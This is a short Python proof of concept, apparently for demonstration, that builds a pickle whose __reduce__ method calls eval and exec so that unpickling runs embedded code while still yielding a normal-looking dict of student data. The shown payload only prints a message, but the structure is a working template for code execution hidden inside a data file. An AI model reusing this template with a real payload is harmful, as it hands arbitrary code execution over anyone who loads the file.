import pickle


class Malicious(dict):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)

    # (callable, args, state, list_iterator, dict_iterator)
    def __reduce__(self):
        # eval returns the dict() object
        # exec returns None, so we use or dict()
        # This executes arbitrary code while keeping the pickling structure intact.
        return eval, (
        f"exec(\"print('This pickle executes code but and still returns the dict')\") or dict()",), None, None, iter(
            self.items())


student = Malicious(**{
    "name": "John",
    "age": 30,
    "courses": ["Math", "Science"]
})

with open("worse_pickle.pkl", "wb") as f:
    pickle.dump(student, f)
